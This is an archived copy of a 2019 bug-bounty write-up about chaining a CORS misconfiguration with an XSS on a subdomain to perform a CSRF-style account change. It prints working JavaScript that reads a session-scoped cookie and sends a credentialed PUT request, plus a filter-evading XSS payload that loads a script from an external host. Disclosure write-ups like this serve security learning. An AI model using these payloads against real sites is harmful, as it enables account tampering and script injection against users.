---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-27_cors-to-csrf-attack.md
original_filename: 2019-06-27_cors-to-csrf-attack.md
title: CORS To CSRF Attack
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- cors
- csrf
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- cors
- csrf
language: en
raw_sha256: c5fd60d59226ea7e56ed0a239278609f327722cd76721e4e5645eca07b4319ae
text_sha256: bbb9c6f325089d4cd3292ddc33ddcf691e837b2f58f615e8002186321aac79b1
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# CORS To CSRF Attack

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-27_cors-to-csrf-attack.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, cors, csrf
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `c5fd60d59226ea7e56ed0a239278609f327722cd76721e4e5645eca07b4319ae`
- Text SHA256: `bbb9c6f325089d4cd3292ddc33ddcf691e837b2f58f615e8002186321aac79b1`


## Content

---
title: "CORS To CSRF Attack"
url: "https://medium.com/@osamaavvan/cors-to-csrf-attack-c33a595d441"
authors: ["Osama Avvan (@osamaavvan)"]
bugs: ["CORS misconfiguration", "CSRF"]
publication_date: "2019-06-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5182
scraped_via: "browseros"
---

# CORS To CSRF Attack

CORS To CSRF Attack
Osama Avvan
Follow
2 min read
·
Jun 27, 2019

262

This writeup is about the CORS Misconfiguration by which I was able to perform a CSRF attack to change other users account Info. The target let’s just say it was named redact.com was sending a PUT request to the server for updating User Information like Address, Name, etc.

An Origin Header was also sent in the request Origin: redact.com which was reflected in the Response and the Access-Control-Allow-Credentials was set to True. Which means that cookies can be sent along with the request. I tried to change the Origin Header value to evil.com and then redact.com.evil.com but both were rejected. But sending the
Origin: evil.redact.com worked which means that sub domain of redact.com can send requests to its API.

Press enter or click to view image in full size

Now I needed an XSS on one of its subdomains to send the PUT request to the Server, luckily I got an XSS on help.redact.com. But it wasn’t enough an enctyptedMembershipNumer param was sent along with the PUT request to identify the user. After looking into the Cookies of redact.com I found that the enctyptedMembershipNumer was saved in a cookie with a name prop_29 which was scoped to the .redact.com the dot, in the beginning, means that this cookie can be accessed from its subdomains. So to extract that Cookie I wrote a JS code.

function getCookie(name) {
var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’));
if (match) return match[2];
}

Now the complete code to get the enctyptedMembershipNumer and to send the PUT request.

function getCookie(name) {
var match = document.cookie.match(new RegExp(‘(^| )’ + name + ‘=([^;]+)’));
if (match) return match[2];
}

cook = getCookie(“prop_29”)

data = {“member”:{“mailingAddress”:{“addressLineOne”:”Account Hacked”,”city”:”NEW Port”,”stateOrProvinceCode”:”NY”,”postalCode”:”20001",”email”:”hacked@gmail.com”,”countryCode”:”US”}}}

fetch(`https://www.redact.com/api/node/vivaldi/v1/account/primary-contact?encryptedMembershipNumber=${cook}`, {method: “PUT”, credentails: “include”, body: JSON.stringify(data)})

I created a JS file and uploaded the code on my server to use in the XSS payload.

Get Osama Avvan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Final Payload:

https://help.redact.com/app/answers/list?searchTerm=<svg onload=script=document[‘createElement’](‘script’);script[‘src’]=’https:&#47;&#47;osamaavvan&#46;000webhostapp&#46;com&#47;a&#46;js’;document[‘head’][‘appendChild’](script);>

The . and // were removed from the Payload by the XSS filter so I converted them to their respective HTML entities.

Thank You for Reading.

📝 Read this story later in Journal.

👩‍💻 Wake up every Sunday morning to the week’s most noteworthy stories in Tech waiting in your inbox. Read the Noteworthy in Tech newsletter.
